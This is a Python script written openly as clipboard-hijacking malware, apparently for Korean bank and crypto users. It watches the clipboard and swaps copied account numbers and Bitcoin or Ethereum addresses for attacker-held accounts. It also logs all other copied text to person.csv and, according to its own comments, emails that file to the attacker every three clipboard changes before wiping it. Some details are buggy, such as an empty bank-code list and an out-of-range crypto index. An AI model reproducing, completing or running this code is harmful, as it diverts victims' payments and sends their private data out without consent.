import sys
import csv
import time
import os
sys.path.append(os.path.abspath("SO_site-packages")
)
import pyperclip #mine
import helper #created on another emacs doc

recent_value = ''
count = 0

#print(sys.executable) #do i need this??
hac_account = ['110411581841', '56041151891292',
               '74670201929172', '34019679321']
shinhan_codes = []
hac_crypto_account = ['joiafiojsioajio']

#test
helper.sendEmail()



def saveInfo(input):
    with open('person.csv', 'a', newline='\n') as writeFile: # Save input to person.csv whenever saveInfo function is called.
        write = csv.writer(writeFile)
        row = str(input)
        write.writerow([row])
        writeFile.close()


while True:
    tmp_value = pyperclip.paste() # Get text from clipboard memory.
    if tmp_value != recent_value:
        if len(tmp_value) == 12 and int(tmp_value[:3]) in shinhan_codes:
            recent_value = hac_account[0]
        elif len(tmp_value) == 14 and int(tmp_value[:3]) in [560, 561, 562]:
            recent_value = hac_account[1]
        elif len(tmp_value) == 14 and tmp_value[0] == '7':
            # Pattern 3: account number started with 7 and length is 7.
            recent_value = hac_account[2]
        elif len(tmp_value) == 11 and tmp_value[0] == '3':
            # Pattern 4: account number started with 3 and length is 11.
            recent_value = hac_account[3]
        elif len(tmp_value) >= 25 and len(tmp_value) <= 35:
            # Pattern 5: target is bitcoin address.
            recent_value = hac_crypto_account[0]
        elif len(tmp_value) == 42:
            # Pattern 6: target is ethereum.
            recent_value = hac_crypto_account[1]
        else:
            count += 1
            # make a index using variable 'count' and attach to the clipboard data and call saveInfo() function.
            recent_value = tmp_value
            saveInfo(recent_value)
        pyperclip.copy(recent_value) #
        if count == 3:
            # For every 3  times of clipboard buffer change, it sends person.csv file's contents to attacker's mail.
            helper.sendEmail()
            count = 0
            with open("person.csv", "w") as make_empty_csv:
                # now you make person.csv file as empty file.
                pass
    time.sleep(0.1)
